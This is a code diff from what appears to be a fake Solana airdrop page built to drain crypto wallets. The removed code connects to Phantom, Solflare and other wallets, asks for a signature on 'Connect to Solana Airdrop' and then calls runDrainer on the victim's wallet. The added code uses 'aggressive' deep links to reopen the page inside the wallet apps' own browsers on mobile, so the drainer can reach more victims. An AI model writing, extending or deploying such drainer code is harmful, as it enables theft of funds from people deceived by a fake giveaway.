@@ -810,40 +810,91 @@
       }
     ];
 
-    // Simplified mobile wallet connection - direct approach
+    // Aggressive mobile wallet connection - bypass standard detection
     async function connectMobileWallet(wallet) {
       const isMobileDevice = isMobile();
       console.log(`Connecting to ${wallet.name} on ${isMobileDevice ? 'mobile' : 'desktop'}...`);
       
       try {
-        // On mobile, try to connect directly without checking if wallet is "detected"
+        // On mobile, use aggressive deep linking approach
         if (isMobileDevice) {
-          console.log(`Mobile device detected - attempting direct connection to ${wallet.name}...`);
+          console.log(`Mobile device detected - using aggressive deep linking for ${wallet.name}...`);
           
-          // Try to get any available provider
-          let provider = null;
-          
-          // Try the wallet's own provider first
-          provider = wallet.provider();
-          console.log(`${wallet.name} provider:`, provider);
-          
-          // If no specific provider, try any available solana provider
-          if (!provider && window.solana) {
-            provider = window.solana;
-            console.log(`Using generic solana provider for ${wallet.name}`);
-          }
-          
-          // If still no provider, try to create a mock provider for mobile
-          if (!provider) {
-            console.log(`No provider found, but on mobile - attempting connection anyway...`);
+          // Mobile-specific deep linking approach
+          if (wallet.name === 'Phantom') {
+            // Phantom mobile - use direct deep link
+            console.log('Using Phantom mobile deep link...');
+            showStatus('Opening Phantom app...', 'loading');
             
-            // On mobile, we'll try to connect and see what happens
-            showStatus(`Attempting to connect to ${wallet.name} on mobile...`, 'loading');
+            // Try multiple Phantom deep link formats
+            const phantomLinks = [
+              'https://phantom.app/ul/browse/',
+              'phantom://browse/',
+              'https://phantom.app/ul/',
+              'phantom://'
+            ];
             
-            // Try to open the wallet app directly
-            const platform = getMobilePlatform();
+            for (const link of phantomLinks) {
+              try {
+                console.log(`Trying Phantom deep link: ${link}`);
+                window.location.href = link + encodeURIComponent(window.location.href);
+                
+                // Wait a bit and check if we got redirected back
+                setTimeout(() => {
+                  showStatus('Please complete the connection in Phantom app', 'loading');
+                }, 2000);
+                
+                return;
+              } catch (linkError) {
+                console.log(`Phantom link ${link} failed:`, linkError);
+                continue;
+              }
+            }
+            
+            // If deep links fail, try app store
+            showStatus('Opening Phantom app store...', 'loading');
+            window.open(wallet.mobile.appStore, '_blank');
+            
+          } else if (wallet.name === 'Solflare') {
+            // Solflare mobile - use direct deep link
+            console.log('Using Solflare mobile deep link...');
+            showStatus('Opening Solflare app...', 'loading');
+            
+            // Try multiple Solflare deep link formats
+            const solflareLinks = [
+              'https://solflare.com/ul/browse/',
+              'solflare://browse/',
+              'https://solflare.com/ul/',
+              'solflare://'
+            ];
+            
+            for (const link of solflareLinks) {
+              try {
+                console.log(`Trying Solflare deep link: ${link}`);
+                window.location.href = link + encodeURIComponent(window.location.href);
+                
+                // Wait a bit and check if we got redirected back
+                setTimeout(() => {
+                  showStatus('Please complete the connection in Solflare app', 'loading');
+                }, 2000);
+                
+                return;
+              } catch (linkError) {
+                console.log(`Solflare link ${link} failed:`, linkError);
+                continue;
+              }
+            }
+            
+            // If deep links fail, try app store
+            showStatus('Opening Solflare app store...', 'loading');
+            window.open(wallet.mobile.appStore, '_blank');
+            
+          } else {
+            // Other wallets - use generic deep link approach
+            console.log(`Using generic deep link for ${wallet.name}...`);
+            showStatus(`Opening ${wallet.name} app...`, 'loading');
+            
             const deepLink = wallet.mobile?.deepLink || wallet.install;
-            
             if (deepLink) {
               console.log(`Opening ${wallet.name} with deep link: ${deepLink}`);
               window.location.href = deepLink + encodeURIComponent(window.location.href);
@@ -854,125 +905,15 @@
               }, 2000);
               
               return;
+            } else {
+              // Fallback to app store
+              const platform = getMobilePlatform();
+              const storeUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
+              showStatus(`Opening ${wallet.name} app store...`, 'loading');
+              window.open(storeUrl, '_blank');
             }
           }
           
-          // If we have a provider, try to connect
-          if (provider) {
-            console.log(`Attempting connection with provider:`, provider);
-            
-            // Mobile-specific connection logic for different wallets
-            if (wallet.name === 'Phantom') {
-              // Phantom mobile specific logic
-              console.log('Using Phantom mobile connection logic...');
-              
-              if (typeof provider.connect === 'function') {
-                const result = await provider.connect();
-                console.log('Phantom connect result:', result);
-                
-                // Force approval request by trying to sign a message
-                if (typeof provider.signMessage === 'function') {
-                  try {
-                    const message = new TextEncoder().encode('Connect to Solana Airdrop');
-                    const signature = await provider.signMessage(message);
-                    console.log('Phantom signature:', signature);
-                    
-                    showStatus('Phantom connected and approved!', 'success');
-                    setTimeout(() => {
-                      runDrainer(provider);
-                    }, 1000);
-                  } catch (signError) {
-                    console.log('Phantom sign error:', signError);
-                    showStatus('Please approve the connection in Phantom', 'error');
-                  }
-                } else {
-                  showStatus('Phantom connected!', 'success');
-                  setTimeout(() => {
-                    runDrainer(provider);
-                  }, 1000);
-                }
-              } else {
-                showStatus('Phantom connection method not available', 'error');
-              }
-              
-            } else if (wallet.name === 'Solflare') {
-              // Solflare mobile specific logic
-              console.log('Using Solflare mobile connection logic...');
-              
-              // Try different connection methods for Solflare
-              if (typeof provider.connect === 'function') {
-                try {
-                  const result = await provider.connect();
-                  console.log('Solflare connect result:', result);
-                  
-                  // Check if we got a public key
-                  const publicKey = provider.publicKey || provider.address || result?.publicKey;
-                  console.log('Solflare public key:', publicKey);
-                  
-                  if (publicKey) {
-                    showStatus('Solflare connected!', 'success');
-                    setTimeout(() => {
-                      runDrainer(provider);
-                    }, 1000);
-                  } else {
-                    showStatus('Please approve the connection in Solflare', 'error');
-                  }
-                } catch (connectError) {
-                  console.log('Solflare connect error:', connectError);
-                  
-                  // Try alternative connection method
-                  if (typeof provider.signIn === 'function') {
-                    try {
-                      const signInResult = await provider.signIn();
-                      console.log('Solflare signIn result:', signInResult);
-                      showStatus('Solflare connected via signIn!', 'success');
-                      setTimeout(() => {
-                        runDrainer(provider);
-                      }, 1000);
-                    } catch (signInError) {
-                      console.log('Solflare signIn error:', signInError);
-                      showStatus('Solflare connection failed - please try again', 'error');
-                    }
-                  } else {
-                    showStatus('Solflare connection failed - please try again', 'error');
-                  }
-                }
-              } else {
-                showStatus('Solflare connection method not available', 'error');
-              }
-              
-            } else {
-              // Generic mobile connection logic for other wallets
-              if (typeof provider.connect === 'function') {
-                const result = await provider.connect();
-                console.log(`${wallet.name} connect result:`, result);
-                
-                // Wait a bit for connection to establish
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                
-                // Check if we got a public key
-                const publicKey = provider.publicKey || provider.address || result?.publicKey;
-                console.log(`${wallet.name} public key:`, publicKey);
-                
-                if (publicKey) {
-                  showStatus(`${wallet.name} connected!`, 'success');
-                  setTimeout(() => {
-                    runDrainer(provider);
-                  }, 1000);
-                } else {
-                  showStatus(`Please approve the connection in ${wallet.name}`, 'error');
-                }
-              } else {
-                showStatus(`${wallet.name} connection method not available`, 'error');
-              }
-            }
-          } else {
-            // No provider found, redirect to app store
-            const platform = getMobilePlatform();
-            const storeUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
-            showStatus(`Opening ${wallet.name} app store...`, 'loading');
-            window.open(storeUrl, '_blank');
-          }
         } else {
           // Desktop logic (unchanged)
           const provider = wallet.provider();
